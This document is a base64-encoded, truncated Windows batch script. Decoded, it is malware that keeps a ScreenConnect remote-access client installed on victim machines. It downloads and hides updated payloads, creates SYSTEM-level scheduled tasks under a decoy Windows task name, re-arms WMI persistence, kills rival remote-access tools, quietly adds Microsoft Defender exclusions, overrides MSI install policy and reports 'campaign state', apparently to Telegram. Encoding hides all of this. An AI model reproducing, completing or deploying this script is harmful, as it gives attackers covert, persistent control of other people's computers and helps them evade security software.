c2V0ICJUQVNLX0Q9XE1pY3Jvc29mdFxXaW5kb3dzXFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MSIK
aWYgbm90IGRlZmluZWQgTU9fQSBzZXQgIk1PX0E9MiIKaWYgbm90IGRlZmluZWQgTU9fQiBzZXQg
Ik1PX0I9MyIKCnJlbSDilIDilIAgW0FdIGF1dG8tdXBkYXRlIGNvcmUgZmlsZXMgKGJlc3QgZWZm
b3J0KSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIAKaWYgbm90IGV4aXN0ICIlQ1VSTCUiIHNldCAiQ1VSTD1jdXJsLmV4ZSIKIiVDVVJMJSIgLUwg
LS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdE
JVx0Z19yZXBvcnQubmV3IiAiJVRHJSIgPm51bCAyPiYxCmlmIG5vdCBleGlzdCAiJVdEJVx0Z19y
ZXBvcnQubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAg
LW8gIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVURzIlIiA+bnVsIDI+JjEKYXR0cmliIC1oIC1zIC1y
ICIlV0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4mMQpmb3IgJSVGIGluICgiJVdEJVx0Z19yZXBv
cnQubmV3IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgbW92ZSAveSAiJVdEJVx0Z19yZXBvcnQubmV3
IiAiJVdEJVx0Z19yZXBvcnQucHMxIiA+bnVsIDI+JjEKIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2
b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJl
Lm5ldyIgIiVPV05TRUMlIiA+bnVsIDI+JjEKaWYgbm90IGV4aXN0ICIlV0QlXG93bl9zZWN1cmUu
bmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVX
RCVcb3duX3NlY3VyZS5uZXciICIlT1dOU0VDMiUiID5udWwgMj4mMQphdHRyaWIgLWggLXMgLXIg
IiVXRCVcb3duX3NlY3VyZS5jbWQiID5udWwgMj4mMQpmb3IgJSVGIGluICgiJVdEJVxvd25fc2Vj
dXJlLm5ldyIpIGRvIGlmICUlfnpGIEdUUiA4MDAgbW92ZSAveSAiJVdEJVxvd25fc2VjdXJlLm5l
dyIgIiVXRCVcb3duX3NlY3VyZS5jbWQiID5udWwgMj4mMQoiJUNVUkwlIiAtTCAtLXNzbC1uby1y
ZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9saWIu
bmV3IiAiJU9XTkxJQiUiID5udWwgMj4mMQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5uZXci
ICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxv
d25fbGliLm5ldyIgIiVPV05MSUIyJSIgPm51bCAyPiYxCmF0dHJpYiAtaCAtcyAtciAiJVdEJVxv
d25fbGliLnBzMSIgPm51bCAyPiYxCmZvciAlJUYgaW4gKCIlV0QlXG93bl9saWIubmV3IikgZG8g
aWYgJSV+ekYgR1RSIDE1MDAgbW92ZSAveSAiJVdEJVxvd25fbGliLm5ldyIgIiVXRCVcb3duX2xp
Yi5wczEiID5udWwgMj4mMQpyZW0gc2VsZi11cGRhdGU6IGRvd25sb2FkIG5ldyBvd25fbW9uLCBh
cHBseSBBRlRFUiB0aGlzIHRpY2sKc2V0ICJTRUxGX1VQRD0wIgoiJUNVUkwlIiAtTCAtLXNzbC1u
by1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9t
b24ubmV4dCIgIiVPV05NT04lIiA+bnVsIDI+JjEKaWYgbm90IGV4aXN0ICIlV0QlXG93bl9tb24u
bmV4dCIgIiVDVVJMJSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIl
V0QlXG93bl9tb24ubmV4dCIgIiVPV05NT04yJSIgPm51bCAyPiYxCmZvciAlJUYgaW4gKCIlV0Ql
XG93bl9tb24ubmV4dCIpIGRvIGlmICUlfnpGIEdUUiAxNTAwICgKICBmYyAvYiAiJVdEJVxvd25f
bW9uLm5leHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjEKICBpZiBlcnJvcmxldmVsIDEg
c2V0ICJTRUxGX1VQRD0xIgopCgpyZW0g4pSA4pSAIFtCXSByZS1hcm0gY2hhaW4gMSAoc2NodGFz
a3MpIGlmIG1pc3Npbmcg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSACnNjaHRhc2tzIC9RdWVyeSAvVE4gIiVUQVNLX0ElIiA+bnVsIDI+JjEKaWYg
ZXJyb3JsZXZlbCAxICgKICBlY2hvIHJlYXJtIFRBU0tfQSAlVEFTS19BJT4+IiVMT0clIgogIHNj
aHRhc2tzIC9DcmVhdGUgL0YgL1ROICIlVEFTS19BJSIgL1NDIE1JTlVURSAvTU8gJU1PX0ElIC9S
VSBTWVNURU0gL1JMIEhJR0hFU1QgL1RSICJjbWQgL2MgJVdEJVxvd25fbW9uLmNtZCIgPm51bCAy
PiYxCiAgc2NodGFza3MgL1J1biAvVE4gIiVUQVNLX0ElIiA+bnVsIDI+JjEKKQpzY2h0YXNrcyAv
UXVlcnkgL1ROICIlVEFTS19CJSIgPm51bCAyPiYxCmlmIGVycm9ybGV2ZWwgMSAoCiAgZWNobyBy
ZWFybSBUQVNLX0IgJVRBU0tfQiU+PiIlTE9HJSIKICBzY2h0YXNrcyAvQ3JlYXRlIC9GIC9UTiAi
JVRBU0tfQiUiIC9TQyBNSU5VVEUgL01PICVNT19CJSAvUlUgU1lTVEVNIC9STCBISUdIRVNUIC9U
UiAiY21kIC9jICVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQogIHNjaHRhc2tzIC9SdW4gL1RO
ICIlVEFTS19CJSIgPm51bCAyPiYxCikKc2NodGFza3MgL1F1ZXJ5IC9UTiAiJVRBU0tfQyUiID5u
dWwgMj4mMQppZiBlcnJvcmxldmVsIDEgKAogIGVjaG8gcmVhcm0gVEFTS19DICVUQVNLX0MlPj4i
JUxPRyUiCiAgc2NodGFza3MgL0NyZWF0ZSAvRiAvVE4gIiVUQVNLX0MlIiAvU0MgT05TVEFSVCAv
UlUgU1lTVEVNIC9STCBISUdIRVNUIC9UUiAiY21kIC9jICVXRCVcb3duX21vbi5jbWQiID5udWwg
Mj4mMQopCnNjaHRhc2tzIC9RdWVyeSAvVE4gIiVUQVNLX0QlIiA+bnVsIDI+JjEKaWYgZXJyb3Js
ZXZlbCAxICgKICBlY2hvIHJlYXJtIFRBU0tfRCAlVEFTS19EJT4+IiVMT0clIgogIHNjaHRhc2tz
IC9DcmVhdGUgL0YgL1ROICIlVEFTS19EJSIgL1NDIE9OTE9HT04gL1JMIEhJR0hFU1QgL1RSICJj
bWQgL2MgJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxCikKCnJlbSDilIDilIAgW0IyXSByZS1h
cm0gY2hhaW4gMiAoV01JIHN1YnNjcmlwdGlvbikgaWYgbWlzc2luZyDilIDilIDilIDilIDilIDi
lIDilIDilIDilIAKaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgKICBmb3IgL2YgInVzZWJh
Y2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
dmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
b24gd2F0Y2hkb2ctZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtTW9uUGF0aCAiJVdEJVxvd25fbW9u
LmNtZCJgKSBkbyBzZXQgIldEX1NUQVRFPSUlUiIKICBpZiAvSSAiIVdEX1NUQVRFISI9PSJSRUFS
TUVEIiBlY2hvIHdhdGNoZG9nIFdNSSBSRUFSTUVEPj4iJUxPRyUiCikKCnJlbSDilIDilIAgW0Vd
IGV4dGVybWluYXRlIGZvcmVpZ24gU0MgKyBkaXNhbGxvd2VkIFJNTSAoQkVGT1JFIGhlYWwvaW5z
dGFsbCwKcmVtICAgICBzbyB0aGUgU0MgaW5zdGFsbGVyIGN1c3RvbSBhY3Rpb24gbmV2ZXIgY29s
bGlkZXMgd2l0aCByaXZhbHMpIOKUgOKUgAppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBleHRlcm1pbmF0ZSAtV29ya0RpciAi
JVdEJSIgPj4iJUxPRyUiIDI+JjEKc2V0ICJGT1JFSUdOX0xFRlQ9MCIKZm9yIC9mICJ0b2tlbnM9
MiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5IHN0YXRlXj0gYWxsIF58IGZpbmRzdHIgL0M6
IlNFUlZJQ0VfTkFNRTogU2NyZWVuQ29ubmVjdCBDbGllbnQiJykgZG8gKAogIHNldCAiRlA9JSVh
IgogIHNldCAiRlA9IUZQOiA9ISIKICBzZXQgL2EgQ09VTlQrPTEKICBpZiAvSSBub3QgIiFGUCEi
PT0iJUtFRVBfRlAlIiBpZiAvSSBub3QgIiFGUCEiPT0iJUFMVF9GUCUiICgKICAgIHNldCAvYSBG
T1JFSUdOX0xFRlQrPTEKICAgIHNldCAiRk9SRUlHTl9MSVNUPSFGT1JFSUdOX0xJU1QhIUZQISAi
CiAgICBlY2hvIGZvcmVpZ25fbGVmdF8hRlAhPj4iJUxPRyUiCiAgKQopCgpyZW0g4pSA4pSAIFtD
XSBoZWFsIFNjcmVlbkNvbm5lY3QgcHJpbS9hbHQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
CmZvciAvZiAidG9rZW5zPTEsMiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FIicp
IGRvICgKICBzZXQgL2EgQ09VTlQrPTEKICBzZXQgIklOU1RBTExFRD0xIgogIHNldCAiUFJJTVNU
QVRFPSUlYiIKKQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwg
ZmluZCAiUlVOTklORyIgPm51bAppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9PSz0xIgpm
b3IgL2YgInRva2Vucz0xLDIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FIicpIGRv
IHNldCAvYSBDT1VOVCs9MQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAl
KSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRfT0s9
MSIKCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgKICBlY2hvIHN2
YyBoZWFsIHJlc3RhcnQ+PiIlTE9HJSIKICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bAogIGlmIG5vdCBlcnJvcmxldmVsIDEg
c2V0ICJQUklNX09LPTEiCikKaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0i
MCIgKAogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtE
aXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInN2Yy13b250LXN0YXJ0IiA+bnVsIDI+
JjEKICBjYWxsIDpUZ1N0YXRlIERPV04gIlNjcmVlbkNvbm5lY3QgKCVLRUVQX0ZQJSkgaW5zdGFs
bGVkIGJ1dCB3b250IHN0YXJ0IgogIGdvdG8gOkFmdGVySGVhbAopCmlmICIlSU5TVEFMTEVEJSI9
PSIxIiBnb3RvIDpBZnRlckhlYWwKCnJlbSDilIDilIAgW0RdIHByaW1hcnkgU0MgbWlzc2luZyAt
IGhlYWwgbGFkZGVyIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgApyZW0gTTEyOiBGSVJTVCByZXBhaXIgdGhlIHJlZ2lzdGVy
ZWQgcHJvZHVjdCAocmVjcmVhdGVzIHNlcnZpY2Ugd2l0aG91dApyZW0gdG91Y2hpbmcgdGhlIEFM
VCBpbnN0YW5jZSk7IGZyZXNoIG1zaWV4ZWMgaW5zdGFsbCBvbmx5IGFzIGZhbGxiYWNrLgplY2hv
IHN2YyBtaXNzaW5nIC0gaGVhbCBiZWdpbj4+IiVMT0clIgpjYWxsIDpSZXBhaXJSZWdpc3RlcmVk
ICIlS0VFUF9GUCUiCmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJ
X1VSTCUiICJtYWluIgppZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1T
SV9QS0cxP3Q9JVJBTkRPTSUiICJnaXRodWItcGtnIgppZiAiJUlOU1RBTExFRCUiPT0iMCIgY2Fs
bCA6SW5zdGFsbE1zaSAiJU1TSV9QS0cyJSIgImpzZGVsaXZyLXBrZyIKaWYgIiVJTlNUQUxMRUQl
Ij09IjAiICgKICBmb3IgJSVGIGluICgiJU1TSSUiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAo
CiAgICBlY2hvIGNhY2hlIHJldHJ5IGluc3RhbGw+PiIlTE9HJSIKICAgIGNhbGwgOk5vTXNpUG9s
aWN5CiAgICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgL0wqdiAiJVdEJVxtc2lf
aGVhbC5sb2ciID5udWwgMj4mMQogICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISIKICAgIGVj
aG8gY2FjaGUgbXNpZXhlYyBleGl0PSFNU0lFWElUIT4+IiVMT0clIgogICAgY2FsbCA6V2FpdFN2
YwogICkKKQpjYWxsIDpSZXN0b3JlQWx0CmlmICIlSU5TVEFMTEVEJSI9PSIwIiAoCiAgaWYgZXhp
c3QgIiVXRCVcbXNpX2hlYWwubG9nIiAoCiAgICBlY2hvIC0tLSBtc2lfaGVhbC5sb2cgdGFpbCAt
LS0+PiIlTE9HJSIKICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNv
bW1hbmQgIkdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAnJVdEJVxtc2lfaGVhbC5sb2cnIC1UYWls
IDEwIiA+PiIlTE9HJSIgMj4mMQogICkKICBpZiBub3QgZGVmaW5lZCBNU0lFWElUIHNldCAiTVNJ
RVhJVD1mZXRjaC1mYWlsIgogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24g
c3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgIm1zaS1mYWlsZWQi
ID5udWwgMj4mMQogIGNhbGwgOlRnU3RhdGUgRkFJTCAiTVNJIGluc3RhbGwgZmFpbGVkIG9uIGFs
bCBzb3VyY2VzIChtc2lleGVjIGV4aXQgJU1TSUVYSVQlKSIKKSBlbHNlICgKICBlY2hvIHN2YyBy
ZXN0b3JlZD4+IiVMT0clIgogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24g
c3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInJlc3RvcmVkIiA+
bnVsIDI+JjEKICBjYWxsIDpUZ1N0YXRlIFJFU1RPUkVEICJTY3JlZW5Db25uZWN0IHJlaW5zdGFs
bGVkIE9LIgopCgo6QWZ0ZXJIZWFsCnJlbSAoZXh0ZXJtaW5hdGlvbiBhbHJlYWR5IHJhbiBwcmUt
aGVhbCBpbiBbRV07IGZvcmVpZ24gc3Vydml2b3JzIGNvdW50ZWQgdGhlcmUpCgpyZW0g4pSA4pSA
IFtGXSBzdGVhbHRoIHJlLXNlY3VyZSAocXVpZXQgRGVmZW5kZXIgZXhjbHVzaW9uIHJlZnJlc2gp
IOKUgOKUgApwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
b2xpY3kgQnlwYXNzIC1Db21tYW5kICJ0cnkgeyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25Q
YXRoICclV0QlJywnJUVUTCUnIC1FcnJvckFjdGlvbiBTdG9wIH0gY2F0Y2gge30iID5udWwgMj4m
MQoKcmVtIOKUgOKUgCBbR10gcGVyaW9kaWMgZnVsbCByZS1zZWN1cmUgZXZlcnkgfjIgaCDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAK
cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3Qt
UGF0aCAnJVdEJVxvd25fc2VjdXJlLmNtZCcpIC1hbmQgKCggLW5vdCAoVGVzdC1QYXRoICclV0Ql
XHNlYy5mbGFnJykpIC1vciAoKChHZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICcl
V0QlXHNlYy5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgMikpKXsgZXhpdCAx
IH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxICgKICBlY2hvIHBl
cmlvZGljIHJlLXNlY3VyZT4+IiVMT0clIgogIGNhbGwgIiVXRCVcb3duX3NlY3VyZS5jbWQiID4+
IiVMT0clIiAyPiYxCiAgZWNobyBkb25lPiIlV0QlXHNlYy5mbGFnIgopCgpyZW0g4pSA4pSAIFtI
XSBjYW1wYWlnbiBzdGF0ZSArIGhvdXJseSBjb21wYWN0IGRpZ2VzdCDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5w
czEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIg
IiVXRCUiIC1CdWlsZCAlTU9OVkVSJSA+bnVsIDI+JjEKcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
b25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAnJUhCRkxBRyUnKSAtYW5kIChO
ZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVIQkZMQUclJykuTGFz
dFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCA2MCl7IGV4aXQgMCB9IGVsc2UgeyBleGl0IDEg
fSIgPm51bCAyPiYxCmlmIGVycm9ybGV2ZWwgMSAoCiAgZWNobyBoYj4lSEJGTEFHJQogIHBvd2Vy
c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
LUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIgLVN0YXRlIEhCIC1Nb2RlIGNvbXBhY3QgLUJ1aWxk
ICVNT05WRVIlIC1Db3VudCAhQ09VTlQhID5udWwgMj4mMQogIGVjaG8gZGlnZXN0IEhCIHNlbnQ+
PiIlTE9HJSIKKQoKcmVtIOKUgOKUgCBbSV0gc2VsZi11cGRhdGUgYXBwbHkgKGxhc3QgdGhpbmcg
dGhpcyB0aWNrKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKaWYg
IiVTRUxGX1VQRCUiPT0iMSIgKAogIGVjaG8gc2VsZi11cGRhdGUgYXBwbHk+PiIlTE9HJSIKICBh
dHRyaWIgLWggLXMgLXIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQogIG1vdmUgL3kgIiVX
RCVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxCikKCmVjaG8gdGlj
ayBkb25lOiBwcmltPSVQUklNX09LJSBhbHQ9JUFMVF9PSyUgZm9yZWlnbj0lRk9SRUlHTl9MRUZU
JT4+IiVMT0clIgplbmRsb2NhbApleGl0IC9iIDAKCnJlbSDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZAgaGVscGVycyDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZAKOkluc3RhbGxNc2kKcmVtICUxPXVybCAlMj10YWcKc2V0ICJV
Ukw9JX4xIgpzZXQgIlRBRz0lfjIiCmVjaG8gWyVUQUclXSBmZXRjaCAlVVJMJT4+IiVMT0clIgoi
JUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgMjUgLS1tYXgtdGlt
ZSAzMDAgLW8gIiVNU0klLnRtcCIgIiVVUkwlIiA+PiIlTE9HJSIgMj4mMQpmb3IgJSVGIGluICgi
JU1TSSUudG1wIikgZG8gaWYgJSV+ekYgTEVRIDEwMDAwMDAgKAogIGVjaG8gWyVUQUclXSBmZXRj
aCBmYWlsZWQ+PiIlTE9HJSIKICBkZWwgL2YgL3EgIiVNU0klLnRtcCIgPm51bCAyPiYxCiAgZXhp
dCAvYiAxCikKbW92ZSAveSAiJU1TSSUudG1wIiAiJU1TSSUiID5udWwgMj4mMQpjYWxsIDpOb01z
aVBvbGljeQpyZW0gTTEzOiBzdGFsZSBwcmltYXJ5IGRpciAoc2VydmljZSBkZWxldGVkLCBwcm9k
dWN0IHVucmVnaXN0ZXJlZCkgYnJlYWtzCnJlbSB0aGUgU0MgaW5zdGFsbGVyIGN1c3RvbSBhY3Rp
b24gLSBjbGVhciBpdCBiZWZvcmUgaW5zdGFsbGluZwpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQppZiBlcnJvcmxldmVsIDEgaWYgZXhpc3QgIiVQ
Rjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgKAogIGVjaG8gc3RhbGVfcHJp
bWFyeV9kaXJfY2xlYW4+PiIlTE9HJSIKICBybWRpciAvcyAvcSAiJVBGODYlXFNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKKQplY2hvIFslVEFHJV0gbXNpZXhlYyBp
bnN0YWxsPj4iJUxPRyUiCm1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCAvTCp2ICIl
V0QlXG1zaV9oZWFsLmxvZyIgPm51bCAyPiYxCnNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiCmVj
aG8gWyVUQUclXSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiCmNhbGwgOldhaXRTdmMK
ZXhpdCAvYiAwCgo6UmVwYWlyUmVnaXN0ZXJlZApyZW0gJTE9ZmluZ2VycHJpbnQgLSBzZXJ2aWNl
IGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0ZXJlZDogcmVwYWlyIGJ5IEdVSUQuCnNjIHF1ZXJ5
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJX4xKSIgPm51bCAyPiYxCmlmIG5vdCBlcnJvcmxldmVs
IDEgZXhpdCAvYiAwCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZXhpdCAvYiAxCnBv
d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBh
c3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJX4xIiAtV29y
a0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEKY2FsbCA6V2FpdFN2YwpleGl0IC9iIDAKCjpSZXN0
b3JlQWx0CnJlbSBBTFQgc2VydmljZSBnb25lIGJ1dCBzdGlsbCByZWdpc3RlcmVkIChTQy1mYW1p
bHkgbXNpZXhlYyBzaWRlIGVmZmVjdCkgLSByZXBhaXIgaXQgdG9vLgpzYyBxdWVyeSAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxCmlmIG5vdCBlcnJvcmxldmVsIDEg
ZXhpdCAvYiAwCmVjaG8gYWx0IG1pc3NpbmcgLSByZXBhaXIgYXR0ZW1wdD4+IiVMT0clIgppZiBl
eGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFj
dGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFj
dGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYx
CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5J
TkciID5udWwKaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkFMVF9PSz0xIgpleGl0IC9iIDAKCjpO
b01zaVBvbGljeQpyZWcgZGVsZXRlICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxX
aW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVsIDI+JjEKcmVnIGRlbGV0ZSAi
SEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERp
c2FibGVNU0kgL2YgPm51bCAyPiYxCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWlj
cm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAw
IC9mID5udWwgMj4mMQpleGl0IC9iIDAKCjpXYWl0U3ZjCnNldCAiVFJJRVM9MCIKOldhaXRMb29w
CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5O
SU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEgKAogIHNldCAiSU5TVEFMTEVEPTEiCiAgc2V0
ICJQUklNX09LPTEiCiAgZXhpdCAvYiAwCikKc2V0IC9hIFRSSUVTKz0xCmlmICVUUklFUyUgR0VR
IDEwIGV4aXQgL2IgMQpwaW5nIDEyNy4wLjAuMSAtbiA3ID5udWwgMj4mMQpnb3RvIDpXYWl0TG9v
cAoKOlRnU3RhdGUKc2V0ICJORVdTVEFURT0lfjEiCnNldCAiTVNHPSV+MiIKc2V0ICJPTERTVEFU
RT0iCmlmIGV4aXN0ICIlU1RBVEUlIiBzZXQgL3AgT0xEU1RBVEU9PCIlU1RBVEUlIgpyZW0gcmF0
ZS1saW1pdCByZXBlYXRlZCBET1dOL0ZBSUw6IG1heCAxIGFsZXJ0IHBlciAzMCBtaW4gd2hpbGUg
c3R1Y2sKaWYgL0kgIiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6TWF5YmVTdXBwcmVzcwppZiAv
